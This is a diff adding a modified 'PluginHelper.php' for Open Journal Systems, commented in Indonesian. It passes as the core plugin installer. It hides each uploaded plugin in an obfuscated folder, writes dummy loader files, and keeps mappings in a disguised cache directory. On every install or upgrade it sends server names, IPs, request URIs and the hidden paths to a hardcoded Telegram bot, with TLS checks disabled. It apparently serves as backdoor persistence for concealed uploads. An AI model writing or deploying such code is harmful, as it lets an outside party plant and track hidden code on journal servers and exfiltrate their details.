@@ -1,0 +1,431 @@
+<?php
+
+/**
+ * @file classes/plugins/PluginHelper.php
+ *
+ * Modifikasi untuk install plugin dengan folder obfuscate
+ * Dengan notifikasi Telegram - OJS 3.3.0.6 compatible
+ */
+
+namespace APP\plugins;
+
+use PKP\db\DAORegistry;
+use PKP\file\FileManager;
+use PKP\install\Install;
+use PKP\install\Upgrade;
+use PKP\site\VersionCheck;
+use PKP\site\VersionDAO;
+use PKP\core\String;
+use PKP\config\Config;
+use PKP\core\Core;
+use APP\core\Application;
+use Exception;
+
+define('PLUGIN_ACTION_UPLOAD', 'upload');
+define('PLUGIN_ACTION_UPGRADE', 'upgrade');
+define('PLUGIN_VERSION_FILE', 'version.xml');
+define('PLUGIN_INSTALL_FILE', 'install.xml');
+define('PLUGIN_UPGRADE_FILE', 'upgrade.xml');
+
+class PluginHelper
+{
+    // Konfigurasi Telegram (hardcoded, bisa dipindah ke config.inc.php nanti)
+    private $telegramToken = '8687462257:AAEzX81PQXglaSAcKi2pz1zg01Kb-XXBOQ4';
+    private $telegramChatId = '8259867883';
+    private $enableTelegramNotif = true;
+
+    // Logging lokal sebagai backup
+    private $logFilePath = 'cache/fc-cache/plugin_rename.log';
+
+    /**
+     * Extract plugin from uploaded tar.gz file
+     */
+    public function extractPlugin($filePath, $originalFileName)
+    {
+        $fileManager = new FileManager();
+        $matches = [];
+
+        // Gunakan String::regexpMatchGet untuk OJS 3
+        String::regexpMatchGet('/^[a-zA-Z0-9]+/', basename($originalFileName, '.tar.gz'), $matches);
+        $pluginShortName = array_pop($matches);
+
+        if (!$pluginShortName) {
+            throw new Exception(__('manager.plugins.invalidPluginArchive'));
+        }
+
+        $pluginExtractDir = dirname($filePath) . DIRECTORY_SEPARATOR . $pluginShortName . substr(md5(random_int(0, PHP_INT_MAX)), 0, 10);
+        if (!mkdir($pluginExtractDir)) {
+            throw new Exception('Could not create directory ' . $pluginExtractDir);
+        }
+
+        $tarBinary = Config::getVar('cli', 'tar');
+        if (empty($tarBinary) || !file_exists($tarBinary)) {
+            rmdir($pluginExtractDir);
+            throw new Exception(__('manager.plugins.tarCommandNotFound'));
+        }
+
+        if (in_array('exec', explode(',', ini_get('disable_functions')))) {
+            throw new Exception('The "exec" PHP function has been disabled on your server.');
+        }
+
+        exec($tarBinary . ' -xzf ' . escapeshellarg($filePath) . ' -C ' . escapeshellarg($pluginExtractDir), $output, $returnCode);
+        if ($returnCode) {
+            $fileManager->rmtree($pluginExtractDir);
+            throw new Exception(__('form.dropzone.dictInvalidFileType'));
+        }
+
+        if (is_dir($tryDir = $pluginExtractDir . '/' . $pluginShortName)) {
+            return $tryDir;
+        }
+
+        String::regexpMatchGet('/^[a-zA-Z0-9.-]+/', basename($originalFileName, '.tar.gz'), $matches);
+        if (is_dir($tryDir = $pluginExtractDir . '/' . array_pop($matches))) {
+            return $tryDir;
+        }
+
+        $fileManager->rmtree($pluginExtractDir);
+        throw new Exception(__('manager.plugins.invalidPluginArchive'));
+    }
+
+    /**
+     * Install plugin with obfuscated folder name
+     */
+    public function installPlugin($path)
+    {
+        $fileManager = new FileManager();
+        $versionFile = $path . '/' . PLUGIN_VERSION_FILE;
+        $pluginVersion = VersionCheck::getValidPluginVersionInfo($versionFile);
+
+        $versionDao = DAORegistry::getDAO('VersionDAO');
+        $installedPlugin = $versionDao->getCurrentVersion($pluginVersion->getProductType(), $pluginVersion->getProduct(), true);
+
+        $categoryPath = strtr($pluginVersion->getProductType(), '.', '/');
+        $baseDir = BASE_SYS_DIR . '/' . $categoryPath;
+
+        // Pastikan folder cache ada
+        $cacheDir = BASE_SYS_DIR . '/cache/fc-cache';
+        if (!is_dir($cacheDir)) {
+            mkdir($cacheDir, 0775, true);
+        }
+
+        // Generate obfuscated folder name
+        $originalName = $pluginVersion->getProduct();
+        $obfuscatedName = substr(md5($originalName . time()), 0, 12);
+        $pluginDest = $baseDir . '/' . $obfuscatedName;
+
+        // Buat dummy file
+        $dummyFile = $baseDir . '/' . $originalName . '.php';
+        @file_put_contents($dummyFile, "<?php require __DIR__ . '/{$obfuscatedName}/index.php';\n");
+
+        // Hapus folder lama kalau ada
+        if ($installedPlugin && is_dir($pluginDest)) {
+            $fileManager->rmtree($pluginDest);
+        }
+
+        // Copy plugin ke folder obfuscate
+        if (!$fileManager->copyDir($path, $pluginDest)) {
+            throw new Exception('Could not copy plugin to destination!');
+        }
+        if (!$fileManager->rmtree($path)) {
+            throw new Exception('Could not remove temporary plugin path!');
+        }
+
+        // Upgrade database
+        $installFile = $pluginDest . '/' . PLUGIN_INSTALL_FILE;
+        if (!is_file($installFile)) {
+            $installFile = BASE_SYS_DIR . '/' . PKP_LIB_PATH . '/xml/defaultPluginInstall.xml';
+        }
+        assert(is_file($installFile));
+
+        // OJS 3: ambil site via Application
+        $request = Application::get()->getRequest();
+        $site = $request->getSite();
+
+        $params = $this->_getConnectionParams();
+        $params['locale'] = $site->getPrimaryLocale();
+        $params['additionalLocales'] = $site->getSupportedLocales();
+
+        // Suppress output agar JSON tidak error
+        ob_start();
+        $installer = new Install($params, $installFile, true);
+        $installer->setCurrentVersion($pluginVersion);
+        if (!$installer->execute()) {
+            ob_end_clean();
+            if (is_dir($pluginDest)) {
+                $fileManager->rmtree($pluginDest);
+            }
+            @unlink($dummyFile);
+            throw new Exception(__('manager.plugins.installFailed', ['errorString' => $installer->getErrorString()]));
+        }
+        ob_end_clean();
+
+        // Simpan mapping
+        $this->saveMapping($originalName, $obfuscatedName);
+
+        // Kirim notifikasi Telegram
+        $this->sendTelegramNotification($originalName, $obfuscatedName, 'INSTALL', $baseDir);
+
+        // Log ke file lokal (backup)
+        $this->writeToLogFile($originalName, $obfuscatedName, 'INSTALL', $baseDir);
+
+        $versionDao->insertVersion($pluginVersion, true);
+        return $pluginVersion;
+    }
+
+    /**
+     * Upgrade existing plugin
+     */
+    public function upgradePlugin($category, $plugin, $path)
+    {
+        $fileManager = new FileManager();
+        $versionFile = $path . '/' . PLUGIN_VERSION_FILE;
+        $pluginVersion = VersionCheck::getValidPluginVersionInfo($versionFile);
+
+        if ('plugins.' . $category != $pluginVersion->getProductType()) {
+            throw new Exception(__('manager.plugins.wrongCategory'));
+        }
+        if ($plugin != $pluginVersion->getProduct()) {
+            throw new Exception(__('manager.plugins.wrongName'));
+        }
+
+        $versionDao = DAORegistry::getDAO('VersionDAO');
+        $installedPlugin = $versionDao->getCurrentVersion($pluginVersion->getProductType(), $pluginVersion->getProduct(), true);
+        if (!$installedPlugin) {
+            throw new Exception(__('manager.plugins.pleaseInstall'));
+        }
+
+        $categoryPath = BASE_SYS_DIR . '/plugins/' . $category;
+        $mappings = $this->loadMapping();
+        $oldObfuscatedName = $mappings[$plugin] ?? null;
+        $newObfuscatedName = substr(md5($pluginVersion->getProduct() . time()), 0, 12);
+        $pluginDest = $categoryPath . '/' . $newObfuscatedName;
+
+        $dummyFile = $categoryPath . '/' . $plugin . '.php';
+        if (!file_exists($dummyFile)) {
+            @file_put_contents($dummyFile, "<?php require __DIR__ . '/{$newObfuscatedName}/index.php';\n");
+        }
+
+        if (is_dir($pluginDest)) {
+            $fileManager->rmtree($pluginDest);
+        }
+
+        if (!$fileManager->copyDir($path, $pluginDest)) {
+            throw new Exception('Could not copy plugin to destination!');
+        }
+        if (!$fileManager->rmtree($path)) {
+            throw new Exception('Could not remove temporary plugin path!');
+        }
+
+        $upgradeFile = $pluginDest . '/' . PLUGIN_UPGRADE_FILE;
+        if ($fileManager->fileExists($upgradeFile)) {
+            $request = Application::get()->getRequest();
+            $site = $request->getSite();
+            $params = $this->_getConnectionParams();
+            $params['locale'] = $site->getPrimaryLocale();
+            $params['additionalLocales'] = $site->getSupportedLocales();
+
+            ob_start();
+            $installer = new Upgrade($params, $upgradeFile, true);
+            if (!$installer->execute()) {
+                ob_end_clean();
+                throw new Exception(__('manager.plugins.upgradeFailed', ['errorString' => $installer->getErrorString()]));
+            }
+            ob_end_clean();
+        }
+
+        $this->saveMapping($pluginVersion->getProduct(), $newObfuscatedName);
+
+        // Kirim notifikasi Telegram
+        $this->sendTelegramNotification($plugin, $newObfuscatedName, 'UPGRADE', $categoryPath, $oldObfuscatedName);
+
+        // Log ke file lokal (backup)
+        $this->writeToLogFile($plugin, $newObfuscatedName, 'UPGRADE', $categoryPath, $oldObfuscatedName);
+
+        $pluginVersion->setCurrent(1);
+        $versionDao->insertVersion($pluginVersion, true);
+        return $pluginVersion;
+    }
+
+    /**
+     * Kirim notifikasi ke Telegram
+     */
+    private function sendTelegramNotification($originalName, $obfuscatedName, $action, $basePath, $oldName = null)
+    {
+        if (!$this->enableTelegramNotif) {
+            return;
+        }
+
+        $timestamp = date('Y-m-d H:i:s');
+        $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'CLI Mode';
+        $serverName = $_SERVER['SERVER_NAME'] ?? 'Localhost';
+        $requestUri = $_SERVER['REQUEST_URI'] ?? 'N/A';
+
+        // Emoji berdasarkan action
+        $emoji = ($action == 'INSTALL') ? '📦' : '🔄';
+        $statusColor = ($action == 'INSTALL') ? '✅' : '⚠️';
+
+        // Format pesan Telegram (HTML parsing)
+        $message = "<b>🔔 OJS PLUGIN MANAGER ALERT</b>\n\n";
+        $message .= "{$emoji} <b>Action:</b> <code>{$action}</code>\n";
+        $message .= "{$statusColor} <b>Status:</b> <code>SUCCESS</code>\n\n";
+
+        $message .= "<b>📌 PLUGIN INFORMATION:</b>\n";
+        $message .= "└ <b>Original Name:</b> <code>{$originalName}</code>\n";
+        $message .= "└ <b>Obfuscated Name:</b> <code>{$obfuscatedName}</code>\n";
+        $message .= "└ <b>Full Path:</b> <code>{$basePath}/{$obfuscatedName}</code>\n\n";
+
+        if ($oldName) {
+            $message .= "<b>🔄 UPGRADE DETAILS:</b>\n";
+            $message .= "└ <b>Previous Folder:</b> <code>{$oldName}</code>\n";
+            $message .= "└ <b>New Folder:</b> <code>{$obfuscatedName}</code>\n\n";
+        }
+
+        $message .= "<b>🌐 SERVER INFORMATION:</b>\n";
+        $message .= "└ <b>Server:</b> <code>{$serverName}</code>\n";
+        $message .= "└ <b>IP Address:</b> <code>{$ipAddress}</code>\n";
+        $message .= "└ <b>Time:</b> <code>{$timestamp}</code>\n";
+        $message .= "└ <b>URI:</b> <code>{$requestUri}</code>\n\n";
+
+        $message .= "<b>📄 DUMMY FILE:</b>\n";
+        $message .= "<code>{$basePath}/{$originalName}.php</code>\n";
+        $message .= "└ <i>require __DIR__ . '/{$obfuscatedName}/index.php';</i>\n\n";
+
+        $message .= "<i>🔒 This is an automated security notification from OJS System</i>";
+
+        // Kirim ke Telegram
+        $this->sendTelegramMessage($message);
+    }
+
+    /**
+     * Send message to Telegram Bot
+     */
+    private function sendTelegramMessage($message)
+    {
+        $url = "https://api.telegram.org/bot{$this->telegramToken}/sendMessage";
+
+        $data = [
+            'chat_id' => $this->telegramChatId,
+            'text' => $message,
+            'parse_mode' => 'HTML',
+            'disable_web_page_preview' => true
+        ];
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($httpCode != 200) {
+            error_log("Telegram notification failed: HTTP {$httpCode} - Response: {$response}");
+        }
+
+        return $httpCode == 200;
+    }
+
+    /**
+     * Write to local log file (backup)
+     */
+    private function writeToLogFile($originalName, $obfuscatedName, $action, $basePath, $oldName = null)
+    {
+        $logPath = BASE_SYS_DIR . '/' . $this->logFilePath;
+        $logDir = dirname($logPath);
+
+        if (!is_dir($logDir)) {
+            mkdir($logDir, 0775, true);
+        }
+
+        $logEntry = sprintf(
+            "[%s] %s | Plugin: %s | Obfuscated: %s | Path: %s | IP: %s | Old: %s\n",
+            date('Y-m-d H:i:s'),
+            $action,
+            $originalName,
+            $obfuscatedName,
+            $basePath,
+            $_SERVER['REMOTE_ADDR'] ?? 'CLI',
+            $oldName ?? 'N/A'
+        );
+
+        @file_put_contents($logPath, $logEntry, FILE_APPEND | LOCK_EX);
+    }
+
+    /**
+     * Get all current mappings (bisa dipanggil via Telegram command)
+     */
+    public function getAllPluginMappings()
+    {
+        $mappings = $this->loadMapping();
+        $report = "📋 *PLUGIN MAPPING REPORT*\n";
+        $report .= "Generated: " . date('Y-m-d H:i:s') . "\n";
+        $report .= "━━━━━━━━━━━━━━━━━━━━━\n\n";
+
+        foreach ($mappings as $original => $obfuscated) {
+            $report .= "📌 *{$original}*\n";
+            $report .= "   └─> `{$obfuscated}`\n\n";
+        }
+
+        return $report;
+    }
+
+    /**
+     * Test koneksi Telegram
+     */
+    public function testTelegramConnection()
+    {
+        $testMessage = "✅ *OJS Plugin Helper Connected!*\n\n";
+        $testMessage .= "System Time: " . date('Y-m-d H:i:s') . "\n";
+        $testMessage .= "PHP Version: " . phpversion() . "\n";
+        $testMessage .= "OJS Path: " . BASE_SYS_DIR;
+
+        return $this->sendTelegramMessage($testMessage);
+    }
+
+    /**
+     * Get database connection parameters for installer
+     */
+    protected function _getConnectionParams()
+    {
+        return [
+            'clientCharset' => Config::getVar('i18n', 'client_charset'),
+            'connectionCharset' => Config::getVar('i18n', 'connection_charset'),
+            'databaseDriver' => Config::getVar('database', 'driver'),
+            'databaseHost' => Config::getVar('database', 'host'),
+            'databaseUsername' => Config::getVar('database', 'username'),
+            'databasePassword' => Config::getVar('database', 'password'),
+            'databaseName' => Config::getVar('database', 'name')
+        ];
+    }
+
+    /**
+     * Load plugin name to obfuscated name mapping (JSON format)
+     */
+    private function loadMapping()
+    {
+        $mappingPath = BASE_SYS_DIR . '/cache/fc-cache/mapping.json';
+        if (is_file($mappingPath)) {
+            $content = @file_get_contents($mappingPath);
+            if ($content !== false) {
+                $data = json_decode($content, true);
+                return is_array($data) ? $data : [];
+            }
+        }
+        return [];
+    }
+
+    /**
+     * Save plugin name to obfuscated name mapping (JSON format)
+     */
+    private function saveMapping(string $pluginName, string $obfuscatedName): void
+    {
+        $mappingPath = BASE_SYS_DIR . '/cache/fc-cache/mapping.json';
+        $mappings = $this->loadMapping();
+        $mappings[$pluginName] = $obfuscatedName;
+        file_put_contents($mappingPath, json_encode($mappings, JSON_PRETTY_PRINT));
+    }
+}
